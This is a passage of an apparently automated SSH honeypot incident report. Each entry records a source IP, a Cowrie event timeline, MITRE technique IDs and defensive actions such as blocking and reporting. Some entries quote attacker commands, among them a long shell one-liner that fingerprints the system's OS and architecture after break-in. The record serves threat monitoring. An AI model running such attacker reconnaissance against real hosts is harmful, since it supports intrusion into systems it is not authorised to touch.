- [ ] Submit `200.37.179[.]83` to AbuseIPDB if not already reported
- [ ] Block `200.37.179[.]83` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd1e30921dc4

| Field | Detail |
|---|---|
| **Source IP** | `181.129.31[.]42` |
| **First Seen** | 2026-07-15 06:35 |
| **Last Seen** | 2026-07-15 06:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:35:17` | `cowrie.session.connect` |
| `2026-07-15 06:35:18` | `cowrie.client.version` |
| `2026-07-15 06:35:18` | `cowrie.client.kex` |
| `2026-07-15 06:35:19` | `cowrie.login.success` |
| `2026-07-15 06:35:20` | `cowrie.direct-tcpip.request` |
| `2026-07-15 06:35:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.129.31[.]42` to AbuseIPDB if not already reported
- [ ] Block `181.129.31[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee67ee2ed83

| Field | Detail |
|---|---|
| **Source IP** | `94.205.250[.]78` |
| **First Seen** | 2026-07-15 06:41 |
| **Last Seen** | 2026-07-15 06:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:41:03` | `cowrie.session.connect` |
| `2026-07-15 06:41:04` | `cowrie.client.version` |
| `2026-07-15 06:41:04` | `cowrie.client.kex` |
| `2026-07-15 06:41:06` | `cowrie.login.success` |
| `2026-07-15 06:41:06` | `cowrie.direct-tcpip.request` |
| `2026-07-15 06:41:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.205.250[.]78` to AbuseIPDB if not already reported
- [ ] Block `94.205.250[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7a30288db3d

| Field | Detail |
|---|---|
| **Source IP** | `103.120.116[.]162` |
| **First Seen** | 2026-07-15 06:41 |
| **Last Seen** | 2026-07-15 06:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:41:17` | `cowrie.session.connect` |
| `2026-07-15 06:41:17` | `cowrie.client.version` |
| `2026-07-15 06:41:17` | `cowrie.client.kex` |
| `2026-07-15 06:41:19` | `cowrie.login.success` |
| `2026-07-15 06:41:20` | `cowrie.direct-tcpip.request` |
| `2026-07-15 06:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.116[.]162` to AbuseIPDB if not already reported
- [ ] Block `103.120.116[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-806131cad90b

| Field | Detail |
|---|---|
| **Source IP** | `219.144.16[.]16` |
| **First Seen** | 2026-07-15 07:00 |
| **Last Seen** | 2026-07-15 07:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:00:16` | `cowrie.session.connect` |
| `2026-07-15 07:00:17` | `cowrie.client.version` |
| `2026-07-15 07:00:17` | `cowrie.client.kex` |
| `2026-07-15 07:00:19` | `cowrie.login.success` |
| `2026-07-15 07:00:20` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.144.16[.]16` to AbuseIPDB if not already reported
- [ ] Block `219.144.16[.]16` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0c7fc460be4

| Field | Detail |
|---|---|
| **Source IP** | `183.82.108[.]109` |
| **First Seen** | 2026-07-15 07:00 |
| **Last Seen** | 2026-07-15 07:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:00:30` | `cowrie.session.connect` |
| `2026-07-15 07:00:31` | `cowrie.client.version` |
| `2026-07-15 07:00:31` | `cowrie.client.kex` |
| `2026-07-15 07:00:33` | `cowrie.login.success` |
| `2026-07-15 07:00:33` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.108[.]109` to AbuseIPDB if not already reported
- [ ] Block `183.82.108[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec6bc7ed94d4

| Field | Detail |
|---|---|
| **Source IP** | `197.251.249[.]75` |
| **First Seen** | 2026-07-15 07:00 |
| **Last Seen** | 2026-07-15 07:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:00:44` | `cowrie.session.connect` |
| `2026-07-15 07:00:45` | `cowrie.client.version` |
| `2026-07-15 07:00:45` | `cowrie.client.kex` |
| `2026-07-15 07:00:47` | `cowrie.login.success` |
| `2026-07-15 07:00:47` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.251.249[.]75` to AbuseIPDB if not already reported
- [ ] Block `197.251.249[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98b1fb645193

| Field | Detail |
|---|---|
| **Source IP** | `78.186.54[.]65` |
| **First Seen** | 2026-07-15 07:00 |
| **Last Seen** | 2026-07-15 07:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:00:52` | `cowrie.session.connect` |
| `2026-07-15 07:00:53` | `cowrie.client.version` |
| `2026-07-15 07:00:53` | `cowrie.client.kex` |
| `2026-07-15 07:00:54` | `cowrie.login.success` |
| `2026-07-15 07:00:54` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:00:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.186.54[.]65` to AbuseIPDB if not already reported
- [ ] Block `78.186.54[.]65` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e962994915be

| Field | Detail |
|---|---|
| **Source IP** | `182.66.193[.]212` |
| **First Seen** | 2026-07-15 07:02 |
| **Last Seen** | 2026-07-15 07:07 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:02:16` | `cowrie.session.connect` |
| `2026-07-15 07:02:16` | `cowrie.client.version` |
| `2026-07-15 07:02:17` | `cowrie.client.kex` |
| `2026-07-15 07:02:18` | `cowrie.login.success` |
| `2026-07-15 07:07:18` | `cowrie.session.file_upload` |
| `2026-07-15 07:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.66.193[.]212` to AbuseIPDB if not already reported
- [ ] Block `182.66.193[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdf5c477e807

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 07:03 |
| **Last Seen** | 2026-07-15 07:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:03:07` | `cowrie.session.connect` |
| `2026-07-15 07:03:08` | `cowrie.client.version` |
| `2026-07-15 07:03:08` | `cowrie.client.kex` |
| `2026-07-15 07:03:10` | `cowrie.login.success` |
| `2026-07-15 07:03:12` | `cowrie.session.params` |
| `2026-07-15 07:03:12` | `cowrie.command.input` |
| `2026-07-15 07:03:12` | `cowrie.log.closed` |
| `2026-07-15 07:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3531b6233de1

| Field | Detail |
|---|---|
| **Source IP** | `49.124.150[.]254` |
| **First Seen** | 2026-07-15 07:03 |
| **Last Seen** | 2026-07-15 07:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:03:50` | `cowrie.session.connect` |
| `2026-07-15 07:03:51` | `cowrie.client.version` |
| `2026-07-15 07:03:51` | `cowrie.client.kex` |
| `2026-07-15 07:03:53` | `cowrie.login.success` |
| `2026-07-15 07:03:54` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.150[.]254` to AbuseIPDB if not already reported
- [ ] Block `49.124.150[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f28b9254908

| Field | Detail |
|---|---|
| **Source IP** | `78.186.54[.]65` |
| **First Seen** | 2026-07-15 07:04 |
| **Last Seen** | 2026-07-15 07:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:04:24` | `cowrie.session.connect` |
| `2026-07-15 07:04:24` | `cowrie.client.version` |
| `2026-07-15 07:04:24` | `cowrie.client.kex` |
| `2026-07-15 07:04:26` | `cowrie.login.success` |
| `2026-07-15 07:04:27` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.186.54[.]65` to AbuseIPDB if not already reported
- [ ] Block `78.186.54[.]65` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18dd47723c38

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-15 07:06 |
| **Last Seen** | 2026-07-15 07:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:06:24` | `cowrie.session.connect` |
| `2026-07-15 07:06:24` | `cowrie.client.version` |
| `2026-07-15 07:06:24` | `cowrie.client.kex` |
| `2026-07-15 07:06:24` | `cowrie.login.success` |
| `2026-07-15 07:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7cd47fec3db

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-15 07:06 |
| **Last Seen** | 2026-07-15 07:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:06:26` | `cowrie.session.connect` |
| `2026-07-15 07:06:26` | `cowrie.client.version` |
| `2026-07-15 07:06:26` | `cowrie.client.kex` |
| `2026-07-15 07:06:26` | `cowrie.login.success` |
| `2026-07-15 07:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cb6184171d6

| Field | Detail |
|---|---|
| **Source IP** | `220.128.137[.]164` |
| **First Seen** | 2026-07-15 07:06 |
| **Last Seen** | 2026-07-15 07:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:06:51` | `cowrie.session.connect` |
| `2026-07-15 07:06:52` | `cowrie.client.version` |
| `2026-07-15 07:06:52` | `cowrie.client.kex` |
| `2026-07-15 07:06:54` | `cowrie.login.success` |
| `2026-07-15 07:06:55` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.128.137[.]164` to AbuseIPDB if not already reported
- [ ] Block `220.128.137[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b19765bfd98

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]60` |
| **First Seen** | 2026-07-15 07:07 |
| **Last Seen** | 2026-07-15 07:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:07:05` | `cowrie.session.connect` |
| `2026-07-15 07:07:06` | `cowrie.client.version` |
| `2026-07-15 07:07:06` | `cowrie.client.kex` |
| `2026-07-15 07:07:07` | `cowrie.login.success` |
| `2026-07-15 07:07:08` | `cowrie.direct-tcpip.request` |
| `2026-07-15 07:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]60` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6445b6c64ee5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-07-15 07:17 |
| **Last Seen** | 2026-07-15 07:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:17:40` | `cowrie.session.connect` |
| `2026-07-15 07:17:41` | `cowrie.client.version` |
| `2026-07-15 07:17:41` | `cowrie.client.kex` |
| `2026-07-15 07:17:43` | `cowrie.login.success` |
| `2026-07-15 07:17:46` | `cowrie.session.params` |
| `2026-07-15 07:17:46` | `cowrie.command.input` |
| `2026-07-15 07:17:46` | `cowrie.command.input` |
| `2026-07-15 07:17:46` | `cowrie.command.input` |
| `2026-07-15 07:17:46` | `cowrie.command.input` |
| `2026-07-15 07:17:46` | `cowrie.command.input` |
| `2026-07-15 07:17:46` | `cowrie.command.success` |
| `2026-07-15 07:17:46` | `cowrie.command.input` |
| `2026-07-15 07:17:46` | `cowrie.command.input` |
| `2026-07-15 07:17:46` | `cowrie.command.input` |
| `2026-07-15 07:17:46` | `cowrie.command.input` |
| `2026-07-15 07:17:46` | `cowrie.log.closed` |
| `2026-07-15 07:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b912b0d551b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]237` |
| **First Seen** | 2026-07-15 07:19 |
| **Last Seen** | 2026-07-15 07:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:19:26` | `cowrie.session.connect` |
| `2026-07-15 07:19:26` | `cowrie.client.version` |
| `2026-07-15 07:19:26` | `cowrie.client.kex` |
| `2026-07-15 07:19:29` | `cowrie.login.success` |
| `2026-07-15 07:19:31` | `cowrie.session.params` |
| `2026-07-15 07:19:31` | `cowrie.command.input` |
| `2026-07-15 07:19:31` | `cowrie.command.input` |
| `2026-07-15 07:19:31` | `cowrie.command.input` |
| `2026-07-15 07:19:31` | `cowrie.command.input` |
| `2026-07-15 07:19:31` | `cowrie.command.input` |
| `2026-07-15 07:19:31` | `cowrie.command.success` |
| `2026-07-15 07:19:31` | `cowrie.command.input` |
| `2026-07-15 07:19:31` | `cowrie.command.input` |
| `2026-07-15 07:19:31` | `cowrie.command.input` |
| `2026-07-15 07:19:31` | `cowrie.command.input` |
| `2026-07-15 07:19:31` | `cowrie.log.closed` |
| `2026-07-15 07:19:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]237` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-555a3ccccbad

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 07:20 |
| **Last Seen** | 2026-07-15 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:20:21` | `cowrie.session.connect` |
| `2026-07-15 07:20:21` | `cowrie.client.version` |
| `2026-07-15 07:20:21` | `cowrie.client.kex` |
| `2026-07-15 07:20:21` | `cowrie.login.success` |
| `2026-07-15 07:20:22` | `cowrie.session.params` |
| `2026-07-15 07:20:22` | `cowrie.command.input` |
| `2026-07-15 07:20:22` | `cowrie.log.closed` |
| `2026-07-15 07:20:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d9b45cc9867

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-15 07:20 |
| **Last Seen** | 2026-07-15 07:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:20:24` | `cowrie.session.connect` |
| `2026-07-15 07:20:24` | `cowrie.client.version` |
| `2026-07-15 07:20:24` | `cowrie.client.kex` |
| `2026-07-15 07:20:25` | `cowrie.login.success` |
| `2026-07-15 07:20:26` | `cowrie.session.params` |
| `2026-07-15 07:20:26` | `cowrie.command.input` |
| `2026-07-15 07:20:26` | `cowrie.log.closed` |
| `2026-07-15 07:20:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3a0c903129f

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-15 07:20 |
| **Last Seen** | 2026-07-15 07:21 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:20:27` | `cowrie.session.connect` |
| `2026-07-15 07:20:27` | `cowrie.client.version` |
| `2026-07-15 07:20:27` | `cowrie.client.kex` |
| `2026-07-15 07:20:32` | `cowrie.login.success` |
| `2026-07-15 07:20:33` | `cowrie.session.params` |
| `2026-07-15 07:20:33` | `cowrie.command.input` |
| `2026-07-15 07:21:03` | `cowrie.log.closed` |
| `2026-07-15 07:21:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b28f5ae7033b

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-15 07:20 |
| **Last Seen** | 2026-07-15 07:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:20:28` | `cowrie.session.connect` |
| `2026-07-15 07:20:28` | `cowrie.client.version` |
| `2026-07-15 07:20:28` | `cowrie.client.kex` |
| `2026-07-15 07:20:29` | `cowrie.login.success` |
| `2026-07-15 07:20:30` | `cowrie.session.params` |
| `2026-07-15 07:20:30` | `cowrie.command.input` |
| `2026-07-15 07:20:30` | `cowrie.log.closed` |
| `2026-07-15 07:20:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b152695248e4

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-15 07:20 |
| **Last Seen** | 2026-07-15 07:21 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:20:30` | `cowrie.session.connect` |
| `2026-07-15 07:20:30` | `cowrie.client.version` |
| `2026-07-15 07:20:30` | `cowrie.client.kex` |
| `2026-07-15 07:20:31` | `cowrie.login.success` |
| `2026-07-15 07:21:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31f8b42108ee

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-15 07:20 |
| **Last Seen** | 2026-07-15 07:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:20:31` | `cowrie.session.connect` |
| `2026-07-15 07:20:31` | `cowrie.client.version` |
| `2026-07-15 07:20:31` | `cowrie.client.kex` |
| `2026-07-15 07:20:33` | `cowrie.login.success` |
| `2026-07-15 07:20:34` | `cowrie.session.params` |
| `2026-07-15 07:20:34` | `cowrie.command.input` |
| `2026-07-15 07:20:35` | `cowrie.log.closed` |
| `2026-07-15 07:20:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ebf1758eb46

| Field | Detail |
|---|---|
| **Source IP** | `8.217.232[.]214` |
| **First Seen** | 2026-07-15 07:20 |
| **Last Seen** | 2026-07-15 07:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 07:20:39` | `cowrie.session.connect` |
| `2026-07-15 07:20:39` | `cowrie.client.version` |
| `2026-07-15 07:20:40` | `cowrie.client.kex` |
| `2026-07-15 07:20:42` | `cowrie.login.success` |
| `2026-07-15 07:20:44` | `cowrie.session.params` |
| `2026-07-15 07:20:44` | `cowrie.command.input` |
| `2026-07-15 07:20:44` | `cowrie.log.closed` |
| `2026-07-15 07:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.232[.]214` to AbuseIPDB if not already reported
- [ ] Block `8.217.232[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
